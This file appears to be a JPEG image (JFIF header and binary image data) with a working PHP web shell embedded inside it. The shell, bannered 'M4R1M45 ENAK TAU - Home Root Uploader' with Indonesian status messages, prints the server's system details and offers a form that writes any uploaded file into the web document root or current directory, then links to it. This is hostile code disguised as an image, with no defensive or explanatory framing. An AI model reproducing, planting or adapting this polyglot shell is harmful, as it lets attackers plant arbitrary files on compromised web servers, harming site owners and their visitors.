���� JFIF  H H  �� <?php
echo "M4R1M45 ENAK TAU - Home Root Uploader<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='idx_file'>
      <input type='submit' name='upload' value='Upload'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "Sukses Cok! -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        } else {
            echo "Gagal Upload Di Document Root.";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
            echo "Sukses Upload <b>$files</b> Di Folder Ini";
        } else {
            echo "Gagal mek!";
        }
    }
}
?>�� C ������������������������������������������������������������������ C������������������������������������������������������������������  �9" ��               �� $      !1AQqa��������                ��               ��   ? ��/ ��`C ���S0�n��cA�>3V�1e�]<��~V�1������x6f2�֚�A�q�ߠ��o�|�@֦�h/��V�u�'�]ԷS;fߔ��C�^�b2�� �@��a�
����?i��|0�`��\�K�q?5>�`-�p�Y�%�3�b/�٘"��'C�[Ϛ����ߥ0� �%��(9��Vk2�V_���=��PZ�lg��<v�r���H^L��t�DQ 5�Q��%E��1����U��q�܀�� ��Ƥ��-����x���~�ֺ@ �  �Pt�6�ݛ�^�q�f!m�@���'���n�g	2�� �/��}$jt��koL�������e�rA	�D �Pc>�gK�y=�+}_�� � \@4����n%���'ڳ��s,c�� �1�/�s�8B�������U��_��[�PC��4	�tfI>�T]DPA	tdOw=y���4��#2����g ��c<�h7�3�d��@�U3���gz�E�S#9<4t#궦�4��*7�5T$�*�Ȩ�� * �$�?�'�(��:���l� �� �(&(������#@_r[h/����Ow��m���Q���L�	��MDO5U  P�K�`�+��;gIt��&( ����A�#>�    ���H&�����z~kY����ѩ)y�5��*�   Ldgj]����R -E RB�Y�����    @Q   F��fMt�@?��8�ǿ�"|��Sɠ%�����(@  �U0�M���[~   T    VI|�����5��9.�-�d�OWLm���,2��4�P@�  �B߄�P  @    @@�PkS�c(��>|38��65zNg���Tj؀"�
"��������      �X�   � Њ��K��B����6���Dt��T[�� ���DUeP     E\���`���_���/f��"�*
��dE:MQ���H���ab�s¡�+6"���/H
�L�@    q0@]A�"��*��TA@0Ƅ�d@ꊋ/�	��EVZ�U*J ��j2 ����� ��*��4�n �  �FW���-ej � �� J�����
�:Q<�@E@X �b��B������<EP
(�"|�*  ?��
